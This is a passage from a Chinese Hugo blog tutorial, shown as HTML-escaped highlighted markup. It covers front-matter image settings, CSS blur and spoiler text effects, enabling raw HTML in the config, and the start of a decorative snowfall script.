&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;ld&#34;&gt;2022-02-08T01:03:14&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;-05&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;你的图片名(带后缀)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;background&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#2a9d8f&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#fff&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nn&#34;&gt;---&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;注意: 请把图片和_index.md放在同一目录里&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;代码给你点color-see-see&#34;&gt;代码:给你点Color See See&lt;/h2&gt;
&lt;p&gt;咳咳，关于代码框框着色问题= =&lt;/p&gt;
&lt;p&gt;只需要指明代码类型是可以着色的qaq&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 275; 
			flex-basis: 661px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/hugo2/c.png&#34; data-size=&#34;670x243&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/hugo2/c.png&#34;
			width=&#34;670&#34;
			height=&#34;243&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/hugo2/c_hu77111778e5bac209ba85be183c177237_17180_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/hugo2/c_hu77111778e5bac209ba85be183c177237_17180_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;代码块着色&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;代码块着色&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;文本特效&#34;&gt;文本特效&lt;/h2&gt;
&lt;p&gt;在&lt;code&gt;网站根目录/static/css/&lt;/code&gt;内新建一个文件&lt;code&gt;custom.css&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;以下是&lt;code&gt;custom.css&lt;/code&gt;代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nc&#34;&gt;blur&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;transparent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;text-shadow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rgba&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nc&#34;&gt;blur&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nd&#34;&gt;hover&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;transparent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;text-shadow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rgba&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nc&#34;&gt;shady&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;#000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;font-weight&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;bold&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;box-shadow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;-20&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rgba&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;inset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
   &lt;span class=&#34;k&#34;&gt;transition&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;all&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.3&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;ease&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nc&#34;&gt;shady&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nd&#34;&gt;hover&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;font-weight&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;bold&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;#FFF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;box-shadow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;-20&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rgba&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;inset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还有，由于你要在&lt;code&gt;MarkDown&lt;/code&gt;中内嵌&lt;code&gt;html&lt;/code&gt;代码，你需要修改一下配置文件(网站根目录下的&lt;code&gt;config.yaml)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;倒数第7行改为&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;unsafe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;高斯模糊&#34;&gt;高斯模糊&lt;/h3&gt;
&lt;p&gt;在你的文章中直接输入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;span&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;blur&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;是高斯模糊呐~ &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;span&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;效果:&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;blur&#34;&gt;是高斯模糊呐&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;黑幕效果&#34;&gt;黑幕效果&lt;/h3&gt;
&lt;p&gt;在你的文章中直接输入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;span&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;shady&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;诶嘿嘿，我藏好了哦&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;span&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;效果&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;shady&#34;&gt;诶嘿嘿，我藏好了哦&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;坑&#34;&gt;坑&lt;/h3&gt;
&lt;p&gt;这样一搞的话回车键/Tab的换行就完蛋了= =, 可以用&lt;code&gt;&amp;lt;br&amp;gt;&lt;/code&gt;放在行末尾来换行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;span&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;blur&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;行1 &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;br&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
行2 &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;br&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
行3&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;span&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;效果&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;blur&#34;&gt;行1 &lt;br&gt;
行2 &lt;br&gt;
行3&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;还有，你不可以将特效和MarkDown基础/特殊语法叠加使用&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;shady&#34;&gt;## 因为它没用= = 即答)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;别打我  逃)&lt;/del&gt;&lt;/p&gt;
&lt;h2 id=&#34;天女散花&#34;&gt;天女散花..?&lt;/h2&gt;
&lt;p&gt;博客酱页面太单调了？我们来丰富一下它吧&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;网站根目录/static/js&lt;/code&gt;里新建一个&lt;code&gt;snow.js&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(如果没有目录的话自己新建)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;snow.js&lt;/code&gt;代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;p&#34;&gt;;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Config&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
       &lt;span class=&#34;nx&#34;&gt;snow&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;❄&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;※&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;⛄&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;☃&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;🎄&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 雪花的样式，可以放不同的雪花，或者任何 emoji，每次生成新雪花时会随机挑选其中一个
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;#d9e2e7&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 雪的颜色
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;speed&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 雪花从生成到落到最底端所经历的时间，单位是秒。数字越小落得越快
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;dom&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementsByTagName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;body&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 下雪的区域，可以保持不变，这样就是全屏下雪
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;interval&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;800&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 生成一片雪花的时间间隔，单位是毫秒
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;dom&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;错误提示&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;$canvas&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;div&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;useStyle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;$canvas&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;100%&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;100%&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;position&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;fixed&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;pointerEvents&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;none&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;zIndex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;setInterval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;$snow&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;div&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;$snow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;innerText&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;snow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;snow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;useStyle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;$snow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;display&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;inline-block&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
